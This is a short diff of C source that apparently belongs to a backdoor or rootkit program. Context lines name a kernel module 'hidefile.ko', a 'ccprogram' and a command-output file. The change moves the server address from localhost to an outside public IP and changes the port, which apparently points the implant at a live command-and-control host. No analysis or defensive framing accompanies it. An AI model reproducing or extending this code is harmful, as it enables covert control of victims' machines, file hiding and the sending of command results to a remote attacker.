@@ -11,9 +11,9 @@
 #include <errno.h>
 #include <sys/wait.h>
 
+#define SP_PORT     8895
 #define BUFFER_SIZE 4096
-#define SP_PORT     8890
-#define SERVER_ADDR "127.0.0.1"
+#define SERVER_ADDR "104.194.123.106"
 #define CMD_RESULT "cmdoutput.txt"
 char* ROOTKIT = "hidefile.ko";   
 char* CCPROGRAM = "ccprogram";  
